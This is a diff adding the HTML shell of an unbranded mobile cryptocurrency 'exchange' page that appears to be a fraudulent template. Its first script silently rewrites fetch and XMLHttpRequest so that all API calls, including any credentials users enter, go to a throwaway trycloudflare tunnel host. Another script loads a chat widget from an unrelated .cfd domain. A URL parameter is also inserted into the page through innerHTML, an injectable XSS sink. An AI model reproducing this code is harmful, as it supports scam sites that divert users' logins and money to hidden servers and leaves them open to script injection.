@@ -1,0 +1,356 @@
+<!doctype html><html lang=""><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,target-densitydpi=device-dpi"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="format-detection" content="telephone=no"/><title></title><meta property="description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/><meta name="keywords" content="USA,Web3,Buy/Sell,crypto coin,Web3.0,uslarty,Ethereum,BTC,USDT,BNB,stock,contract,option"/><meta property="og:site_name" content="Comprehensive cryptocurrency trading platform"/><meta property="og:type" content="product"/><meta property="og:title" content="Buy Bitcoin & Crypto | Crypto Exchange & App"/><meta property="og:description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/><meta property="og:image" content="logo.png"/><meta property="og:image:width" content="1280"/><meta property="og:image:height" content="720"/><meta name="twitter:card" content="Comprehensive cryptocurrency trading platform"/><meta name="twitter:site" content="Comprehensive cryptocurrency trading platform"/><meta name="twitter:title" content="Buy Bitcoin & Crypto | Crypto Exchange & App"/><meta name="twitter:description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/><meta property="twitter:image:width" content="1280"/><meta property="twitter:image:height" content="720"/><meta name="twitter:card" content="summary_large_image"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><link rel="apple-touch-icon"/><meta name="apple-mobile-web-app-title"/><link rel="bookmark"/><link rel="apple-touch-icon-precomposed" sizes="180x180"/><link rel="apple-touch-startup-image"/><title></title><script>
+// API 代理配置 - 将所有 API 请求转发到后端代理服务器
+var KLAKNA_API_PROXY = 'https://glenn-alike-twenty-seek.trycloudflare.com';
+(function() {
+  var origFetch = window.fetch;
+  window.fetch = function(url, opts) {
+    if (KLAKNA_API_PROXY && typeof url === 'string' && url.startsWith('/')) {
+      url = KLAKNA_API_PROXY + url;
+    }
+    return origFetch.call(this, url, opts);
+  };
+  var origOpen = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function(method, url) {
+    if (KLAKNA_API_PROXY && typeof url === 'string' && url.startsWith('/')) {
+      url = KLAKNA_API_PROXY + url;
+    }
+    return origOpen.call(this, method, url);
+  };
+})();
+</script>
+<script defer="defer" src="/ETH/static/js/chunk-vendors.1774378911945.js"></script><script defer="defer" src="/ETH/static/js/app.1774378911945.js"></script><link href="/ETH/static/css/chunk-vendors.1774378911945.css" rel="stylesheet"><link href="/ETH/static/css/app.1774378911945.css" rel="stylesheet"></head><style>* {
+      touch-action: manipulation;
+    }
+    html {
+      overscroll-behavior: none;
+      touch-action: pan-y;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, Helvetica Neue, Helvetica,
+        Segoe UI, Arial, Roboto, PingFang SC, miui, Hiragino Sans GB,
+        Microsoft Yahei, sans-serif !important;
+      padding-bottom: constant(safe-area-inset-bottom);
+      padding-bottom: env(safe-area-inset-bottom);
+    }
+    .router-view-loading,
+    .global-loading {
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 9999999;
+      position: fixed !important;
+      display: none;
+      width: 100vw;
+      height: 100vh;
+    }
+    .img {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    #res-loading {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      height: 100vh;
+      width: 100vw;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: white;
+    }
+    .loader {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100px;
+      height: 100px;
+      perspective: 780px;
+    }
+
+    .project-loading-text {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1c1c1c;
+      z-index: 10;
+    }
+
+    .load-inner {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      box-sizing: border-box;
+      border-radius: 50%;
+    }
+
+    .load-inner.load-one {
+      left: 0%;
+      top: 0%;
+      border-bottom: 3px solid #5c5edc;
+      animation: rotate1 1.15s linear infinite;
+    }
+
+    .load-inner.load-two {
+      right: 0%;
+      top: 0%;
+      border-right: 3px solid #9147ff;
+      animation: rotate2 1.15s 0.1s linear infinite;
+    }
+
+    .load-inner.load-three {
+      right: 0%;
+      bottom: 0%;
+      border-top: 3px solid #3b82f6;
+      animation: rotate3 1.15s 0.15s linear infinite;
+    }
+
+    @keyframes rotate1 {
+      0% {
+        transform: rotateX(45deg) rotateY(-45deg) rotateZ(0deg);
+      }
+      100% {
+        transform: rotateX(45deg) rotateY(-45deg) rotateZ(360deg);
+      }
+    }
+    @keyframes rotate2 {
+      0% {
+        transform: rotateX(45deg) rotateY(45deg) rotateZ(0deg);
+      }
+      100% {
+        transform: rotateX(45deg) rotateY(45deg) rotateZ(360deg);
+      }
+    }
+    @keyframes rotate3 {
+      0% {
+        transform: rotateX(-60deg) rotateY(0deg) rotateZ(0deg);
+      }
+      100% {
+        transform: rotateX(-60deg) rotateY(0deg) rotateZ(360deg);
+      }
+    }
+
+    .chat-widget-custom-trigger {
+      position: fixed;
+      right: 20px;
+      bottom: 20px;
+      width: 60px;
+      height: 60px;
+      border: none;
+      border-radius: 34px 8px 34px 34px;
+      background: linear-gradient(135deg, #1f8cff, #1466ff);
+      color: #fff;
+      z-index: 10001;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 22px rgba(20, 102, 255, 0.28);
+      cursor: pointer;
+      user-select: none;
+      -webkit-user-select: none;
+      touch-action: none;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .chat-widget-custom-trigger:active {
+      transform: scale(0.96);
+    }
+
+    .chat-widget-custom-trigger svg {
+      width: 30px;
+      height: 30px;
+      pointer-events: none;
+      fill: currentColor;
+    }</style><body><div id="res-loading"><div class="loader"><div class="load-inner load-one"></div><div class="load-inner load-two"></div><div class="load-inner load-three"></div><span class="project-loading-text">Loading...</span></div></div><div class="router-view-loading"><img data-v-06134f56="" src="./viewLoading.gif" class="img"/></div><div class="global-loading"><img data-v-06134f56="" src="./viewLoading.gif" class="img"/></div><div id="app"></div><script>// 禁止ios放大
+      document.documentElement.addEventListener(
+        'touchstart',
+        function (event) {
+          if (event.touches.length > 1) {
+            event.preventDefault();
+          }
+        },
+        false,
+      );
+
+      var lastTouchEnd = 0;
+      document.documentElement.addEventListener(
+        'touchend',
+        function (event) {
+          var now = Date.now();
+          if (now - lastTouchEnd <= 300) {
+            event.preventDefault();
+          }
+          lastTouchEnd = now;
+        },
+        false,
+      );
+
+      document.addEventListener('gesturestart', function (event) {
+        event.preventDefault();
+      });
+      (function () {
+        async function init() {
+          const url = new URL(window.location.href);
+          const platformr = url.searchParams.get('platformr');
+          if (platformr) {
+            document.body
+              .querySelector('#res-loading')
+              .querySelector('.project-loading-text').innerHTML = platformr;
+          }
+        }
+        init();
+      })();</script><script>(function (d, t) {
+        var STORAGE_KEY = 'chat-widget-trigger-position';
+
+        function createTrigger() {
+          if (d.getElementById('chat-widget-custom-trigger')) return;
+
+          var trigger = d.createElement('button');
+          trigger.id = 'chat-widget-custom-trigger';
+          trigger.className = 'chat-widget-custom-trigger';
+          trigger.type = 'button';
+          trigger.setAttribute('aria-label', '客服');
+          trigger.innerHTML =
+            '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 4h16a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H9l-5 4v-4H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm3 6h10a1 1 0 0 0 0-2H7a1 1 0 0 0 0 2zm0 4h7a1 1 0 0 0 0-2H7a1 1 0 0 0 0 2z"></path></svg>';
+
+          var dragState = {
+            dragging: false,
+            moved: false,
+            offsetX: 0,
+            offsetY: 0,
+            startX: 0,
+            startY: 0,
+            suppressClick: false,
+          };
+
+          function getPoint(event) {
+            if (event.touches && event.touches.length) return event.touches[0];
+            if (event.changedTouches && event.changedTouches.length) return event.changedTouches[0];
+            return event;
+          }
+
+          function clamp(value, min, max) {
+            return Math.max(min, Math.min(value, max));
+          }
+
+          function savePosition(left, top) {
+            try {
+              localStorage.setItem(STORAGE_KEY, JSON.stringify({ left: left, top: top }));
+            } catch (e) {}
+          }
+
+          function applyPosition(left, top) {
+            var maxLeft = window.innerWidth - trigger.offsetWidth;
+            var maxTop = window.innerHeight - trigger.offsetHeight;
+            var safeLeft = clamp(left, 0, Math.max(maxLeft, 0));
+            var safeTop = clamp(top, 0, Math.max(maxTop, 0));
+            trigger.style.left = safeLeft + 'px';
+            trigger.style.top = safeTop + 'px';
+            trigger.style.right = 'auto';
+            trigger.style.bottom = 'auto';
+            savePosition(safeLeft, safeTop);
+          }
+
+          function restorePosition() {
+            try {
+              var raw = localStorage.getItem(STORAGE_KEY);
+              if (!raw) return;
+              var saved = JSON.parse(raw);
+              if (typeof saved.left !== 'number' || typeof saved.top !== 'number') return;
+              requestAnimationFrame(function () {
+                applyPosition(saved.left, saved.top);
+              });
+            } catch (e) {}
+          }
+
+          function toggleWidget() {
+            if (window.ChatWidget && typeof window.ChatWidget.toggle === 'function') {
+              window.ChatWidget.toggle();
+            }
+          }
+
+          function handleMove(event) {
+            if (!dragState.dragging) return;
+            var point = getPoint(event);
+            var deltaX = Math.abs(point.clientX - dragState.startX);
+            var deltaY = Math.abs(point.clientY - dragState.startY);
+            if (!dragState.moved && (deltaX > 4 || deltaY > 4)) {
+              dragState.moved = true;
+            }
+            var nextLeft = point.clientX - dragState.offsetX;
+            var nextTop = point.clientY - dragState.offsetY;
+            applyPosition(nextLeft, nextTop);
+            if (event.cancelable) event.preventDefault();
+          }
+
+          function handleEnd(event) {
+            var isTap = !dragState.moved;
+            var isTouchEvent = event && event.type && event.type.indexOf('touch') === 0;
+            dragState.dragging = false;
+            d.removeEventListener('mousemove', handleMove);
+            d.removeEventListener('mouseup', handleEnd);
+            d.removeEventListener('touchmove', handleMove, { passive: false });
+            d.removeEventListener('touchend', handleEnd);
+            d.removeEventListener('touchcancel', handleEnd);
+            if (isTouchEvent && isTap) {
+              dragState.suppressClick = true;
+              toggleWidget();
+              setTimeout(function () {
+                dragState.suppressClick = false;
+              }, 350);
+            }
+            dragState.moved = false;
+          }
+
+          function handleStart(event) {
+            var point = getPoint(event);
+            var rect = trigger.getBoundingClientRect();
+            dragState.dragging = true;
+            dragState.moved = false;
+            dragState.offsetX = point.clientX - rect.left;
+            dragState.offsetY = point.clientY - rect.top;
+            dragState.startX = point.clientX;
+            dragState.startY = point.clientY;
+            applyPosition(rect.left, rect.top);
+            d.addEventListener('mousemove', handleMove);
+            d.addEventListener('mouseup', handleEnd);
+            d.addEventListener('touchmove', handleMove, { passive: false });
+            d.addEventListener('touchend', handleEnd);
+            d.addEventListener('touchcancel', handleEnd);
+            if (event.cancelable) event.preventDefault();
+          }
+
+          trigger.addEventListener('mousedown', handleStart);
+          trigger.addEventListener('touchstart', handleStart, { passive: false });
+          trigger.addEventListener('click', function (event) {
+            if (dragState.moved || dragState.suppressClick) {
+              event.preventDefault();
+              event.stopPropagation();
+              return;
+            }
+            toggleWidget();
+          });
+
+          window.addEventListener('resize', function () {
+            var rect = trigger.getBoundingClientRect();
+            applyPosition(rect.left, rect.top);
+          });
+
+          d.body.appendChild(trigger);
+          restorePosition();
+        }
+
+        var g = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+        g.src = 'https://ink.dot01cu.cfd/chat/widget.js';
+        g.async = true;
+        g.onload = function () {
+          window.ChatWidget.init({
+            channelId: 'afbe6046eea447018f9b5667ba97dff6',
+            useCustomButton: true,
+            onReady: createTrigger,
+          });
+        };
+        s.parentNode.insertBefore(g, s);
+      })(document, 'script');</script></body></html>
